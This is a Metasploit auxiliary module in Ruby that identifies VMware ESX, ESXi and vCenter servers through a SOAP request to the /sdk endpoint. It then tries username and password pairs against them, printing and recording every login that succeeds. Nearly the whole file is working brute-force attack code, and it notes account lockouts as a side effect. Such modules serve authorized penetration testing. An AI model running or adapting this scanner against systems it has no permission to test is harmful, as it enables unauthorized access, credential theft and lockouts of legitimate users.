##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::VIMSoap
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'VMware Web Login Scanner',
      'Description' => %(
        This module attempts to authenticate to the VMware
        HTTP service for VMware Server, ESX, and ESXI.
      ),
      'Author' => ['theLightCosine'],
      'References' => [
        [ 'CVE', '1999-0502'] # Weak password
      ],
      'License' => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => true },
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptString.new('URI', [true, 'The default URI to login with', '/sdk']),
        Opt::RPORT(443)
      ]
    )
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'vmware',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(_ip)
    return unless is_vmware?

    each_user_pass do |user, pass|
      result = vim_do_login(user, pass)
      case result
      when :success
        print_good "#{rhost}:#{rport} - Successful Login! (#{user}:#{pass})"
        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: result)
        return if datastore['STOP_ON_SUCCESS']
      when :fail
        print_error "#{rhost}:#{rport} - Login Failure (#{user}:#{pass})"
      end
    end
  end

  # Mostly taken from the Apache Tomcat service validator
  def is_vmware?
    soap_data =
      %(<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <env:Body>
      <RetrieveServiceContent xmlns="urn:vim25">
        <_this type="ServiceInstance">ServiceInstance</_this>
      </RetrieveServiceContent>
      </env:Body>
      </env:Envelope>)

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['URI']),
      'method' => 'POST',
      'agent' => 'VMware VI Client',
      'data' => soap_data
    }, 25)

    unless res
      vprint_error("#{rhost}:#{rport} Error: no response")
      return false
    end

    fingerprint_vmware(res)
  rescue ::Rex::ConnectionError
    vprint_error("#{rhost}:#{rport} Error: could not connect")
    return false
  rescue StandardError => e
    vprint_error("#{rhost}:#{rport} Error: #{e}")
    return false
  end

  def fingerprint_vmware(res)
    unless res
      vprint_error("#{rhost}:#{rport} Error: no response")
      return false
    end
    return false unless res.body.include?('<vendor>VMware, Inc.</vendor>')

    os_match = res.body.match(%r{<name>([\w\s]+)</name>})
    ver_match = res.body.match(%r{<version>([\w\s.]+)</version>})
    build_match = res.body.match(%r{<build>([\w\s.-]+)</build>})
    full_match = res.body.match(%r{<fullName>([\w\s.-]+)</fullName>})

    if full_match
      print_good "#{rhost}:#{rport} - Identified #{full_match[1]}"
      report_service(host: rhost, port: rport, proto: 'tcp', sname: 'https', info: full_match[1])
    end

    unless os_match && ver_match && build_match
      vprint_error("#{rhost}:#{rport} Error: Could not identify host as VMware")
      return false
    end

    if os_match[1].include?('ESX') || os_match[1].include?('vCenter')
      # Report a fingerprint match for OS identification
      report_note(
        host: rhost,
        ntype: 'fingerprint.match',
        data: { 'os.vendor' => 'VMware', 'os.product' => os_match[1] + ' ' + ver_match[1], 'os.version' => build_match[1] }
      )
      return true
    end
  end
end
